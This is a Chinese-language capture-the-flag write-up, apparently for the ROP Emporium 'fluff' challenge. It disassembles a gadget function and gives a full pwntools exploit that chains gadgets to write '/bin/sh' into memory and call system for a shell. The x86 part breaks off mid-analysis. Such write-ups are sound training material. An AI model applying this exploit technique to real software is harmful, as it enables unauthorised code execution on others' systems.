<!DOCTYPE html>
<html class="writer-html5" lang="zh-CN" >
<head>
  <meta charset="utf-8" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>fluff &mdash; rop emporium writeup  æ–‡æ¡£</title>
      <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
      <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  <!--[if lt IE 9]>
    <script src="../_static/js/html5shiv.min.js"></script>
  <![endif]-->
  
        <script data-url_root="../" id="documentation_options" src="../_static/documentation_options.js"></script>
        <script src="../_static/jquery.js"></script>
        <script src="../_static/underscore.js"></script>
        <script src="../_static/doctools.js"></script>
        <script src="../_static/translations.js"></script>
    <script src="../_static/js/theme.js"></script>
    <link rel="index" title="ç´¢å¼•" href="../genindex.html" />
    <link rel="search" title="æœç´¢" href="../search.html" /> 
</head>

<body class="wy-body-for-nav"> 
  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >
            <a href="../index.html" class="icon icon-home"> rop emporium writeup
          </a>
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="åœ¨æ–‡æ¡£ä¸­æœç´¢" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>
        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <!-- Local TOC -->
              <div class="local-toc"><ul>
<li><a class="reference internal" href="#">fluff</a><ul>
<li><a class="reference internal" href="#working-backwards">Working backwards</a></li>
<li><a class="reference internal" href="#do-it">Do it!</a></li>
<li><a class="reference internal" href="#x64">x64</a></li>
<li><a class="reference internal" href="#x86">x86</a></li>
</ul>
</li>
</ul>
</div>
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">rop emporium writeup</a>
      </nav>

      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="Page navigation">
  <ul class="wy-breadcrumbs">
      <li><a href="../index.html" class="icon icon-home"></a> &raquo;</li>
      <li>fluff</li>
      <li class="wy-breadcrumbs-aside">
            <a href="../_sources/5_fluff/README.md.txt" rel="nofollow"> æŸ¥çœ‹é¡µé¢æºç </a>
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
             
  <section id="fluff">
<h1>fluff<a class="headerlink" href="#fluff" title="æ°¸ä¹…é“¾æ¥è‡³æ ‡é¢˜">ïƒ</a></h1>
<p>viaï¼šhttps://ropemporium.com/challenge/fluff.html</p>
<p>The concept here is identical to the write4 challenge. The only difference is we may struggle to find gadgets that will get the job done. If we take the time to consider a different approach weâ€™ll succeed.
Click below to download the binary.</p>
<p><a class="reference external" href="https://ropemporium.com/binary/fluff.zip">64bit</a> <a class="reference external" href="https://ropemporium.com/binary/fluff32.zip">32bit</a></p>
<section id="working-backwards">
<h2>Working backwards<a class="headerlink" href="#working-backwards" title="æ°¸ä¹…é“¾æ¥è‡³æ ‡é¢˜">ïƒ</a></h2>
<p>Once weâ€™ve employed our usual drills of checking protections and searching for interesting symbols and strings we can think about what weâ€™re trying to acheive and plan our chain. A solid approach is to work backwards; weâ€™ll need a mov [reg], reg or something equivalent to make the actual write so we can start there.</p>
</section>
<section id="do-it">
<h2>Do it!<a class="headerlink" href="#do-it" title="æ°¸ä¹…é“¾æ¥è‡³æ ‡é¢˜">ïƒ</a></h2>
<p>Thereâ€™s not much more to this challenge, we just have to think about ways to move data into the registers we want to control. Sometimes weâ€™ll need to take an indirect approach, especially in smaller binaries with fewer available gadgets like this one. Once youâ€™ve got a working write primitive go ahead and craft your solution. If you donâ€™t feel like doing the hard work note that the 64 bit version of this challenge can also be pwned using the same single link chain that works on write4 ğŸ¤¦â€â™‚ï¸</p>
</section>
<section id="x64">
<h2>x64<a class="headerlink" href="#x64" title="æ°¸ä¹…é“¾æ¥è‡³æ ‡é¢˜">ïƒ</a></h2>
<p><img alt="image-20200503034541636" src="../_images/image-20200503034541636.png" /></p>
<p>å¯ä»¥çœ‹åˆ°æ¼æ´ç‚¹è¿™é‡Œ</p>
<p>å¡«å……é•¿åº¦ï¼š<code class="docutils literal notranslate"><span class="pre">0x20</span> <span class="pre">+</span> <span class="pre">0x8</span></code></p>
<p><img alt="image-20200503034832940" src="../_images/image-20200503034832940.png" /></p>
<p>ç¨‹åºå¼€äº† <code class="docutils literal notranslate"><span class="pre">NX</span></code> ä¹Ÿå°±æ˜¯æ ˆä¸å¯æ‰§è¡Œï¼Œä¸èƒ½åƒå‰é¢ä¸€æ ·ç›´æ¥ä½¿ç”¨ <code class="docutils literal notranslate"><span class="pre">shellcode</span></code> ç„¶å<code class="docutils literal notranslate"><span class="pre">call</span> <span class="pre">rax</span></code></p>
<p><code class="docutils literal notranslate"><span class="pre">ROPgadget</span></code> çé€›ä¸€ä¸‹</p>
<p><img alt="image-20200503035214952" src="../_images/image-20200503035214952.png" /></p>
<p><img alt="image-20200503035434160" src="../_images/image-20200503035434160.png" /></p>
<p>æ²¡æœ‰æ‹¿ <code class="docutils literal notranslate"><span class="pre">shell</span></code> å’Œæ‹¿ f<code class="docutils literal notranslate"><span class="pre">lag</span></code> çš„å­—ç¬¦ä¸²</p>
<p>ç°åœ¨æœ‰ä¸¤æ¡è·¯å¯ä»¥èµ°</p>
<ul class="simple">
<li><p>ret2libcï¼Œä½¿ç”¨ puts æ³„éœ²å‡º æŸä¸ªå·²ç»è¢« call è¿‡çš„å‡½æ•°çš„ got è¡¨ä¸Šçš„åœ°å€ï¼Œä»è€Œå¾—åˆ° libc çš„åŸºåœ°å€ï¼Œç„¶åç”¨è¿™ä¸ªåŸºåœ°å€åŠ ä¸Š sh åœ¨ libc é‡Œçš„åç§»å¾—åˆ° sh çš„åœ°å€ï¼Œç„¶åè°ƒç”¨ system æ‹¿åˆ° shell</p></li>
<li><p>æ‰¾ gadget æŠŠ sh å†™åˆ°å†…å­˜é‡Œå»ï¼Œç„¶åè°ƒç”¨ system æ‹¿åˆ° shell</p></li>
</ul>
<p>å®˜æ–¹çš„æ„æ€æ˜¯è®©æˆ‘ä»¬ç”¨ç¬¬äºŒç§æ–¹æ³•</p>
<p>æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰é€‚åˆçš„ gadget</p>
<p>ä¸»è¦ç›®çš„æ˜¯å†™å†…å­˜</p>
<p>æˆ‘å¾ˆå¥‡æ€ªï¼Œå›åˆ° ghidra çœ‹çœ‹æ˜¯ä¸æ˜¯æœ‰åé—¨</p>
<p><img alt="image-20200503155929007" src="../_images/image-20200503155929007.png" /></p>
<p>ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿæˆ‘æ˜¨æ™š 4 ç‚¹æ€•æ˜¯çäº†ï¼Œæœ‰ä¸€ä¸ª <code class="docutils literal notranslate"><span class="pre">questionableGadgets()</span></code></p>
<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>                    ********************************************
                    *                 FUNCTION                 *
                    ********************************************
                    undefined questionableGadgets()
         undefined    AL:1      &lt;RETURN&gt;
                    questionableGadgets               XREF[1]: Entry Point(*)  
   00400820 41 5f      POP     R15
   00400822 4d 31 db   XOR     R11,R11
   00400825 41 5e      POP     R14
   00400827 bf 50      MOV     EDI,data_start
            10 60 00
   0040082c c3         RET
   0040082d 41         ??      41h    A
   0040082e 5e         ??      5Eh    ^
   0040082f 4d         ??      4Dh    M
   00400830 31         ??      31h    1
   00400831 e3         ??      E3h
   00400832 41         ??      41h    A
   00400833 5c         ??      5Ch    \
   00400834 41         ??      41h    A
   00400835 bd         ??      BDh
   00400836 60         ??      60h    `
   00400837 40         ??      40h    @
   00400838 60         ??      60h    `
   00400839 00         ??      00h
   0040083a c3         ??      C3h
   0040083b bf         ??      BFh
   0040083c 50         ??      50h    P
   0040083d 10         ??      10h
   0040083e 60         ??      60h    `
   0040083f 00         ??      00h
   00400840 4d         ??      4Dh    M
   00400841 87         ??      87h
   00400842 d3         ??      D3h
   00400843 41         ??      41h    A
   00400844 5f         ??      5Fh    _
   00400845 41         ??      41h    A
   00400846 bb         ??      BBh
   00400847 50         ??      50h    P
   00400848 20         ??      20h     
   00400849 60         ??      60h    `
   0040084a 00         ??      00h
   0040084b c3         ??      C3h
   0040084c 41         ??      41h    A
   0040084d 5f         ??      5Fh    _
   0040084e 4d         ??      4Dh    M
   0040084f 89         ??      89h
   00400850 1a         ??      1Ah
   00400851 41         ??      41h    A
   00400852 5d         ??      5Dh    ]
   00400853 41         ??      41h    A
   00400854 5c         ??      5Ch    \
   00400855 45         ??      45h    E
   00400856 30         ??      30h    0
   00400857 22         ??      22h    &quot;
   00400858 c3         ??      C3h
   00400859 0f         ??      0Fh
   0040085a 1f         ??      1Fh
   0040085b 80         ??      80h
   0040085c 00         ??      00h
   0040085d 00         ??      00h
   0040085e 00         ??      00h
   0040085f 00         ??      00h
</pre></div>
</div>
<p>åé¢è¿™äº›åç¼–è¯‘å™¨é‡åˆ° ret åç›´æ¥ä¸åç¼–è¯‘äº†ï¼Œæ‰‹åŠ¨åç¼–è¯‘çœ‹çœ‹</p>
<p>åæ­£ ghidra ä¸‹ï¼Œé€‰ä¸­ï¼ŒæŒ‰ d å°±å¯ä»¥</p>
<p>æ˜¯è¿™æ ·çš„ï¼š</p>
<p><img alt="image-20200503161826911" src="../_images/image-20200503161826911.png" /></p>
<p>å…¶å®è¿™ä¸ªç®—åŠä¸ªåé—¨</p>
<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>                    ********************************************
                    *                 FUNCTION                 *
                    ********************************************
                    undefined questionableGadgets()
         undefined    AL:1      &lt;RETURN&gt;
                    questionableGadgets               XREF[1]: Entry Point(*)  
   00400820 41 5f      POP     R15
   00400822 4d 31 db   XOR     R11,R11
   00400825 41 5e      POP     R14
   00400827 bf 50      MOV     EDI,data_start
            10 60 00
   0040082c c3         RET
   0040082d 41 5e      POP     R14
   0040082f 4d 31 e3   XOR     R11,R12
   00400832 41 5c      POP     R12
   00400834 41 bd      MOV     R13D,0x604060
            60 40 
            60 00
   0040083a c3         RET
   0040083b bf 50      MOV     EDI,data_start
            10 60 00
   00400840 4d 87 d3   XCHG    R11,R10
   00400843 41 5f      POP     R15
   00400845 41 bb      MOV     R11D,_ITM_registerTMCloneTable    = ??
            50 20 
            60 00
   0040084b c3         RET
   0040084c 41 5f      POP     R15
   0040084e 4d 89 1a   MOV     qword ptr [R10],R11
   00400851 41 5d      POP     R13
   00400853 41 5c      POP     R12
   00400855 45 30 22   XOR     byte ptr [R10],R12B
   00400858 c3         RET
   00400859 0f 1f      NOP     dword ptr [RAX]
            80 00 
            00 00 00
</pre></div>
</div>
<p>æŠ½å–éœ€è¦çš„ gadgetï¼š</p>
<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>   ;è¿™é‡Œå¯ä»¥ç»™ R12 èµ‹å€¼ï¼Œè¿™ä¸ªæœ€ç»ˆä¼šè¿›å…¥ R10ï¼ˆ0x00400832 -&gt; 0x0040082f -&gt; 0x00400840ï¼‰
   00400832 41 5c      POP     R12
   00400834 41 bd      MOV     R13D,0x604060
            60 40 
            60 00
   0040083a c3         RET
   
   ; xor ç½® 0 R11 ï¼Œå› ä¸ºå¦‚æœ R11 ä¸æ˜¯ 0 åé¢ä¼šå½±å“åˆ°ï¼ˆ0x0040082fï¼‰
   00400822 4d 31 db   XOR     R11,R11
   00400825 41 5e      POP     R14
   00400827 bf 50      MOV     EDI,data_start
            10 60 00
   0040082c c3         RET
   
   0040082f 4d 31 e3   XOR     R11,R12
   00400832 41 5c      POP     R12
   00400834 41 bd      MOV     R13D,0x604060
            60 40 
            60 00
   0040083a c3         RET 
   
   ; XCHGæŒ‡ä»¤ï¼ŒåŒæ“ä½œæ•°æŒ‡ä»¤ï¼Œç”¨äºäº¤æ¢ src å’Œ dest æ“ä½œæ•°çš„å†…å®¹ã€‚å…¶ä¸­ï¼Œ src å’Œ dest å¯ä»¥æ˜¯ä¸¤ä¸ªé€šç”¨å¯„å­˜å™¨ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªå¯„å­˜å™¨å’Œä¸€ä¸ª memory ä½ç½®ã€‚
   ; å…¶å®è¿™ä¸€æ­¥æ˜¯ä¸º 0x0040084e å†™å†…å­˜åšé“ºå«ï¼Œå½“ R11 å­˜çš„æ˜¯ä¸€ä¸ªåœ°å€æ—¶ï¼Œåœ¨ 0x0040084e å°±æ˜¯å¾€è¿™ä¸ªåœ°å€å†™
   00400840 4d 87 d3   XCHG    R11,R10
   00400843 41 5f      POP     R15
   00400845 41 bb      MOV     R11D,_ITM_registerTMCloneTable    = ??
            50 20 
            60 00
   0040084b c3         RET
   
   00400822 4d 31 db   XOR     R11,R11
   00400825 41 5e      POP     R14
   00400827 bf 50      MOV     EDI,data_start
            10 60 00
   0040082c c3         RET
   
   0040082f 4d 31 e3   XOR     R11,R12
   00400832 41 5c      POP     R12
   00400834 41 bd      MOV     R13D,0x604060
            60 40 
            60 00
   0040083a c3         RET 
   
   ; å†™å†…å­˜
   0040084e 4d 89 1a   MOV     qword ptr [R10],R11
   00400851 41 5d      POP     R13
   00400853 41 5c      POP     R12
   00400855 45 30 22   XOR     byte ptr [R10],R12B
   00400858 c3         RET
</pre></div>
</div>
<p>æˆ‘ä»¬éœ€è¦æŠŠ <code class="docutils literal notranslate"><span class="pre">/bin/sh</span></code> å­—ç¬¦ä¸² å†™è¿› data æ®µï¼Œå› ä¸ºåœ¨ <code class="docutils literal notranslate"><span class="pre">0x00400827</span></code>  æŠŠ data æ®µçš„åœ°å€æ”¾è¿›äº† edi ç„¶åä¸€ç›´åˆ°æˆ‘ä»¬çš„ rop é“¾ç»“æŸéƒ½æ²¡æœ‰æ”¹å˜è¿‡ï¼Œè¿™æ ·ï¼Œåªè¦ <code class="docutils literal notranslate"><span class="pre">/bin/sh</span></code> çš„åœ°å€ä¸€ç›´å­˜åœ¨ edi é‡Œé¢ï¼Œåœ¨è°ƒç”¨ system çš„æ—¶å€™å°±ä¸ç”¨ pop rdi äº†ã€‚</p>
<p>æœ‰ç‚¹ä¹±ï¼Œä»”ç»†çœ‹å§ï¼Œå†™ payload ï¼š</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/bin/env python2</span>
<span class="c1">#! _*_ coding=utf-8 _*_</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">fluff</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./fluff&quot;</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./fluff&quot;</span><span class="p">)</span>


<span class="n">bin_sh</span> <span class="o">=</span> <span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span>
<span class="n">system_plt</span> <span class="o">=</span> <span class="n">fluff</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">]</span>
<span class="n">pop_r12_ret</span> <span class="o">=</span> <span class="mh">0x400832</span>
<span class="n">pop_r14_ret</span> <span class="o">=</span> <span class="mh">0x400822</span>
<span class="n">xor_r11_r12_pop_r12_ret</span> <span class="o">=</span> <span class="mh">0x0040082f</span> 
<span class="n">pop_r15_ret</span> <span class="o">=</span> <span class="mh">0x00400840</span>
<span class="n">pop_r13_pop_r12_ret</span> <span class="o">=</span> <span class="mh">0x0040084e</span>
<span class="n">data_section</span> <span class="o">=</span> <span class="mh">0x601050</span>

<span class="n">exp</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x28</span>

<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_r12_ret</span><span class="p">)</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">data_section</span><span class="p">)</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">r12 = data_section</span>
<span class="sd">r13 = 0x604060</span>
<span class="sd">&#39;&#39;&#39;</span>

<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_r14_ret</span><span class="p">)</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">8</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">r11 = r11 ^ r11</span>
<span class="sd">r14 = &quot;AAAAAAAA&quot;</span>
<span class="sd">edi = data_start (data_section == data_section)</span>
<span class="sd">&#39;&#39;&#39;</span>


<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">xor_r11_r12_pop_r12_ret</span><span class="p">)</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="n">bin_sh</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">r11 = r11 ^ r12 (r11 == 0, r12 == data_section, æ‰€ä»¥ r11 = data_section)</span>
<span class="sd">r12 = &quot;/bin/sh\x00&quot;</span>
<span class="sd">r13 = 0x604060</span>
<span class="sd">&#39;&#39;&#39;</span>


<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_r15_ret</span><span class="p">)</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">8</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">xchg r11,r10 (äº¤æ¢ r11 å’Œ r10 çš„å€¼)</span>
<span class="sd">r15 = &quot;AAAAAAAA&quot;</span>
<span class="sd">r11 = _ITM_registerTMCloneTable</span>
<span class="sd">&#39;&#39;&#39;</span>


<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_r14_ret</span><span class="p">)</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">8</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">r11 = r11 ^ r11 (r11 = 0)</span>
<span class="sd">r14 = &quot;AAAAAAAA&quot;</span>
<span class="sd">&#39;&#39;&#39;</span>


<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">xor_r11_r12_pop_r12_ret</span><span class="p">)</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">8</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">r11 = r11 ^ r12 (r11 = r12)</span>
<span class="sd">r12 = &quot;AAAAAAAA&quot;</span>
<span class="sd">&#39;&#39;&#39;</span>


<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_r13_pop_r12_ret</span><span class="p">)</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">8</span>
<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">8</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">*(r10) = r11 (å¾€ r10 å­˜çš„åœ°å€ä¸Šå†™å…¥ r11, å…¶å® r11 å°±æ˜¯ /bin/sh\x00, r10 å­˜çš„æ˜¯ data_section)</span>
<span class="sd">ç›¸å½“äºå¾€ data_section å†™å…¥ /bin/sh\x00</span>
<span class="sd">r13 = &quot;AAAAAAAA&quot;</span>
<span class="sd">r12 = &quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span>
<span class="sd">*(r10) = *(r10) ^ r12 (é‚£ä¸ª r12B å°±æ˜¯å– r12 çš„ä¸€ä¸ª Bytesï¼Œä¸ºäº†é˜²æ­¢è¿™ä¸ªç ´å *(r10) ,å‰ä¸€æ­¥æŠŠ r12 ç½® \x00, ä»»ä½•å­—ç¬¦å¼‚æˆ– \x00  éƒ½å¾—åˆ°å®ƒæœ¬èº«)</span>
<span class="sd">&#39;&#39;&#39;</span>


<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_plt</span><span class="p">)</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">call system</span>
<span class="sd">å‚æ•°å°±æ˜¯ data_section</span>
<span class="sd">ä¸Šé¢å·²ç»æŠŠ data_section å¤åˆ¶ç»™ edi</span>
<span class="sd">&#39;&#39;&#39;</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
</div>
<p>å®Œæ•´çš„æ±‡ç¼–æ˜¯è¿™æ ·çš„ï¼š</p>
<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>   0x400804 &lt;pwnme+79&gt;                  nop    
   0x400805 &lt;pwnme+80&gt;                  leave  
   0x400806 &lt;pwnme+81&gt;                  ret    
    â†“
   0x400832 &lt;questionableGadgets+18&gt;    pop    r12
   0x400834 &lt;questionableGadgets+20&gt;    mov    r13d, 0x604060
   0x40083a &lt;questionableGadgets+26&gt;    ret    
    â†“
   0x400822 &lt;questionableGadgets+2&gt;     xor    r11, r11
   0x400825 &lt;questionableGadgets+5&gt;     pop    r14
   0x400827 &lt;questionableGadgets+7&gt;     mov    edi, data_start &lt;0x601050&gt;
   0x40082c &lt;questionableGadgets+12&gt;    ret    
    â†“
   0x40082f &lt;questionableGadgets+15&gt;    xor    r11, r12
   0x400832 &lt;questionableGadgets+18&gt;    pop    r12
   0x400834 &lt;questionableGadgets+20&gt;    mov    r13d, 0x604060
   0x40083a &lt;questionableGadgets+26&gt;    ret    
    â†“
   0x400822 &lt;questionableGadgets+2&gt;     xor    r11, r11
   0x400825 &lt;questionableGadgets+5&gt;     pop    r14
   0x400827 &lt;questionableGadgets+7&gt;     mov    edi, data_start &lt;0x601050&gt;
   0x40082c &lt;questionableGadgets+12&gt;    ret    
    â†“
   0x40082f &lt;questionableGadgets+15&gt;    xor    r11, r12
   0x400832 &lt;questionableGadgets+18&gt;    pop    r12
   0x400834 &lt;questionableGadgets+20&gt;    mov    r13d, 0x604060
   0x40083a &lt;questionableGadgets+26&gt;    ret    
    â†“
   0x400840 &lt;questionableGadgets+32&gt;    xchg   r11, r10
   0x400843 &lt;questionableGadgets+35&gt;    pop    r15
   0x400845 &lt;questionableGadgets+37&gt;    mov    r11d, 0x602050
   0x40084b &lt;questionableGadgets+43&gt;    ret    
    â†“
   0x400822 &lt;questionableGadgets+2&gt;     xor    r11, r11
   0x400825 &lt;questionableGadgets+5&gt;     pop    r14
   0x400827 &lt;questionableGadgets+7&gt;     mov    edi, data_start &lt;0x601050&gt;
   0x40082c &lt;questionableGadgets+12&gt;    ret    
    â†“
   0x40082f &lt;questionableGadgets+15&gt;    xor    r11, r12
   0x400832 &lt;questionableGadgets+18&gt;    pop    r12
   0x400834 &lt;questionableGadgets+20&gt;    mov    r13d, 0x604060
   0x40083a &lt;questionableGadgets+26&gt;    ret    
    â†“
   0x40084e &lt;questionableGadgets+46&gt;    mov    qword ptr [r10], r11
   0x400851 &lt;questionableGadgets+49&gt;    pop    r13
   0x400853 &lt;questionableGadgets+51&gt;    pop    r12
   0x400855 &lt;questionableGadgets+53&gt;    xor    byte ptr [r10], r12b &lt;0x601050&gt;
   0x400858 &lt;questionableGadgets+56&gt;    ret    
    â†“
   0x4005e0 &lt;system@plt&gt;                jmp    qword ptr [rip + 0x200a3a] &lt;0x601020&gt;
</pre></div>
</div>
<p><img alt="image-20200503175326009" src="../_images/image-20200503175326009.png" /></p>
<p>pwnï¼</p>
</section>
<section id="x86">
<h2>x86<a class="headerlink" href="#x86" title="æ°¸ä¹…é“¾æ¥è‡³æ ‡é¢˜">ïƒ</a></h2>
<p>ä¸å¤šè¯´åºŸè¯ï¼Œè¿˜æ˜¯åœ¨ <code class="docutils literal notranslate"><span class="pre">questionableGadgets()</span></code> å‡½æ•°</p>
<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>                    ********************************************
                    *                 FUNCTION                 *
                    ********************************************
                    undefined questionableGadgets()
         undefined    AL:1      &lt;RETURN&gt;
                    questionableGadgets               XREF[1]: Entry Point(*)  
   08048670 5f         POP     EDI
   08048671 31 d2      XOR     EDX,EDX
   08048673 5e         POP     ESI
   08048674 bd be      MOV     EBP,0xcafebabe
            ba fe ca
   08048679 c3         RET
   0804867a 5e         POP     ESI
   0804867b 31 da      XOR     EDX,EBX
   0804867d 5d         POP     EBP
   0804867e bf be      MOV     EDI,0xdeadbabe
            ba ad de
   08048683 c3         RET
   08048684 bf ef      MOV     EDI,0xdeadbeef
            be ad de
   08048689 87 ca      XCHG    EDX,ECX
   0804868b 5d         POP     EBP
   0804868c ba d0      MOV     EDX,0xdefaced0
            ce fa de
   08048691 c3         RET
   08048692 5f         POP     EDI
   08048693 89 11      MOV     dword ptr [ECX],EDX
   08048695 5d         POP     EBP
   08048696 5b         POP     EBX
   08048697 30 19      XOR     byte ptr [ECX],BL
   08048699 c3         RET
   0804869a 66 90      NOP
   0804869c 66 90      NOP
   0804869e 66 90      NOP
</pre></div>
</div>
<p><img alt="image-20200503181532345" src="../_images/image-20200503181532345.png" /></p>
<p>æˆ‘ä»¬çš„ç›®çš„æ˜¯å†™å†…å­˜ï¼Œç›´æ¥æ‰¾åˆ°èƒ½å†™å†…å­˜çš„ <code class="docutils literal notranslate"><span class="pre">gadget</span></code></p>
<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>   08048692 5f         POP     EDI
   08048693 89 11      MOV     dword ptr [ECX],EDX
   08048695 5d         POP     EBP
   08048696 5b         POP     EBX
   08048697 30 19      XOR     byte ptr [ECX],BL
   08048699 c3         RET
</pre></div>
</div>
<p>å†™å…¥ <code class="docutils literal notranslate"><span class="pre">ecx</span></code> å­˜çš„åœ°å€</p>
<p>æ‰¾ï¼Œæ€ä¹ˆç»™ <code class="docutils literal notranslate"><span class="pre">ecx</span></code> èµ‹å€¼ï¼š</p>
<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>   08048689 87 ca      XCHG    EDX,ECX
   0804868b 5d         POP     EBP
   0804868c ba d0      MOV     EDX,0xdefaced0
            ce fa de
   08048691 c3         RET
</pre></div>
</div>
<p>é€šè¿‡ <code class="docutils literal notranslate"><span class="pre">edx</span></code></p>
<p>æ‰¾ï¼Œæ€ä¹ˆç»™ <code class="docutils literal notranslate"><span class="pre">edx</span></code> èµ‹å€¼ï¼š</p>
<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>   0804867a 5e         POP     ESI
   0804867b 31 da      XOR     EDX,EBX
   0804867d 5d         POP     EBP
   0804867e bf be      MOV     EDI,0xdeadbabe
            ba ad de
   08048683 c3         RET
</pre></div>
</div>
<p>è¿™ä¸ªå¼‚æˆ–ä¼šæŠŠç»“æœæ”¾è¿› <code class="docutils literal notranslate"><span class="pre">edx</span></code>ï¼Œè¦ä¹ˆèƒ½æ‰¾åˆ° <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">edx</span></code> å’Œ <code class="docutils literal notranslate"><span class="pre">xor</span> <span class="pre">ebx,ebx</span></code> è¦ä¹ˆ <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">ebx</span></code> å’Œ <code class="docutils literal notranslate"><span class="pre">xor</span> <span class="pre">edx,edx</span></code></p>
<p>æœ‰ï¼š</p>
<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>   08048670 5f         POP     EDI
   08048671 31 d2      XOR     EDX,EDX
   08048673 5e         POP     ESI
   08048674 bd be      MOV     EBP,0xcafebabe
            ba fe ca
   08048679 c3         RET
</pre></div>
</div>
<p>ROPgadget æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰ <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">ebx;</span> <span class="pre">ret</span></code></p>
<p><img alt="image-20200503182259756" src="../_images/image-20200503182259756.png" /></p>
<p>æœ‰</p>
<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>0x080483e1 : pop ebx ; ret
</pre></div>
</div>
<p>å¥½äº†ï¼Œç°åœ¨èƒ½è®¾ç½®å†™å…¥çš„å†…å­˜åœ°å€äº†</p>
<hr class="docutils" />
<p>æ‰¾ä¸€ä¸‹ï¼Œå†™å­—ç¬¦ä¸²æ€ä¹ˆæ”¾è¿›å»</p>
<p>ä¸€æ ·ï¼Œé€†å‘æ‰¾ï¼š</p>
<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>   08048693 89 11      MOV     dword ptr [ECX],EDX
</pre></div>
</div>
<p>éœ€è¦è®¾ç½® <code class="docutils literal notranslate"><span class="pre">edx</span></code></p>
<p>æ²¡æœ‰ç›´æ¥ <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">edx</span></code>ï¼Œåªèƒ½é—´æ¥èµ‹å€¼</p>
<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>   0804867b 31 da      XOR     EDX,EBX
</pre></div>
</div>
